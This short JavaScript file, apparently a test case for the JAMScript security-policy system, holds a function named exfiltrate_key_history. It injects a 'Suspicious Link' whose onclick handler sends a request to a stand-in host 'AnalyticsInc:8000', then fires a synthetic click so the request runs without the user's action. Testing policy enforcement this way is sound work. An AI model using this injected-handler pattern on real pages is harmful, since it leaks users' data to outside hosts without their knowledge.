function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link2", true);xmlhttp.send(null);';
  var link = document.createElement("a");
  link.href = "#";
  JAMScript.set(link, "innerHTML", "Suspicious Link");
  link.id = "mylink";
  JAMScript.call(link.setAttribute, link, ["onclick", exp]);
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAMScript.call(v0.appendChild, v0, [link]);
  var linkref = document.getElementById("mylink");
  var event$$1 = new Event("click");
  linkref.dispatchEvent(event$$1);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

